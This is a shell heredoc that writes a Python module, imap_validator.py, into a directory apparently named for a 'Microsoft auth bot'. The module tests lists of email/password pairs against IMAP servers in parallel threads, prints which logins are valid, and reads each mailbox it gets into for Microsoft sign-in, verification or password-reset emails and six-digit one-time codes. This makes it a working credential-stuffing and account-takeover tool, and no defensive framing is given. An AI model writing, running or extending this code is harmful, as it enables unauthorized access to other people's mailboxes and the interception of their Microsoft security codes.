cat > /opt/microsoft_auth_bot/imap_validator.py << 'PYEOF'
import imaplib
import email
import re
import time
from datetime import datetime, timedelta
from config import IMAP_MAP, DEFAULT_IMAP_SERVER, DEFAULT_IMAP_PORT, IMAP_PORT

class IMAPValidator:
    MICROSOFT_SENDERS = [
        "microsoft.com", "outlook.com", "office365.com",
        "live.com", "noreply@microsoft.com", "security@msft.com"
    ]

    def get_imap_server(self, email_addr):
        domain = email_addr.split("@")[-1].lower().strip()
        if domain in IMAP_MAP:
            return IMAP_MAP[domain]["server"], IMAP_MAP[domain]["port"]
        return DEFAULT_IMAP_SERVER, DEFAULT_IMAP_PORT

    def validate_imap_login(self, email_addr, password, timeout=15):
        result = {
            "email": email_addr,
            "domain": email_addr.split("@")[-1].lower().strip(),
            "imap_server": None,
            "imap_port": None,
            "imap_login": False,
            "can_receive_otp": False,
            "error": None,
            "inbox_count": 0
        }
        server, port = self.get_imap_server(email_addr)
        result["imap_server"] = server
        result["imap_port"] = port
        try:
            mail = imaplib.IMAP4_SSL(server, port, timeout=timeout)
            mail.login(email_addr, password)
            mail.select("INBOX")
            result["imap_login"] = True
            status, data = mail.search(None, "ALL")
            if status == "OK":
                result["inbox_count"] = len(data[0].split()) if data[0] else 0
            result["can_receive_otp"] = self._check_otp_emails(mail, email_addr)
            mail.logout()
        except imaplib.IMAP4.error as e:
            result["error"] = str(e)
        except Exception as e:
            result["error"] = str(e)
        return result

    def _check_otp_emails(self, mail, email_addr):
        try:
            cutoff = (datetime.utcnow() - timedelta(days=30)).strftime("%d-%b-%Y")
            status, data = mail.search(None, f'(SINCE "{cutoff}")')
            if status != "OK" or not data[0]:
                return False
            email_ids = data[0].split()
            for email_id in reversed(email_ids[-20:]):
                status, msg_data = mail.fetch(email_id, "(RFC822)")
                if status != "OK":
                    continue
                raw_email = msg_data[0][1]
                msg = email.message_from_bytes(raw_email)
                from_header = str(msg.get("From", "")).lower()
                subject = str(msg.get("Subject", "")).lower()
                is_microsoft = any(domain in from_header for domain in self.MICROSOFT_SENDERS)
                otp_keywords = ["otp", "verification", "security code", "one-time pass", "sign-in", "password reset", "account verification", "login code"]
                has_otp_subject = any(kw in subject for kw in otp_keywords)
                if is_microsoft and has_otp_subject:
                    return True
                body = self._get_email_body(msg)
                if body and self._contains_otp(body):
                    return True
        except Exception:
            pass
        return False

    def _get_email_body(self, msg):
        body = ""
        if msg.is_multipart():
            for part in msg.walk():
                content_type = part.get_content_type()
                content_disposition = str(part.get("Content-Disposition"))
                if content_type == "text/plain" and "attachment" not in content_disposition:
                    payload = part.get_payload(decode=True)
                    if payload:
                        body += payload.decode(errors="ignore")
        else:
            payload = msg.get_payload(decode=True)
            if payload:
                body = payload.decode(errors="ignore")
        return body

    def _contains_otp(self, text):
        otp_patterns = [
            re.compile(r'\b\d{6}\b'),
            re.compile(r'OTP[:\s]+\d{4,8}', re.IGNORECASE),
            re.compile(r'verification code[:\s]+\d{4,8}', re.IGNORECASE),
        ]
        return any(p.search(text) for p in otp_patterns)

    def validate_batch(self, credentials_list, max_workers=10):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        results = []
        total = len(credentials_list)
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {}
            for i, cred in enumerate(credentials_list):
                future = executor.submit(self.validate_imap_login, cred["email"], cred["password"])
                futures[future] = (i, cred)
            for future in as_completed(futures):
                i, cred = futures[future]
                try:
                    result = future.result()
                    results.append(result)
                    status = "VALID" if result["imap_login"] else "FAILED"
                    print(f"[{i+1}/{total}] {cred['email']} -> {status}")
                except Exception as e:
                    results.append({"email": cred["email"], "imap_login": False, "error": str(e)})
                    print(f"[{i+1}/{total}] {cred['email']} -> ERROR: {e}")
        results.sort(key=lambda x: credentials_list.index(next(c for c in credentials_list if c["email"] == x["email"])))
        return results
PYEOF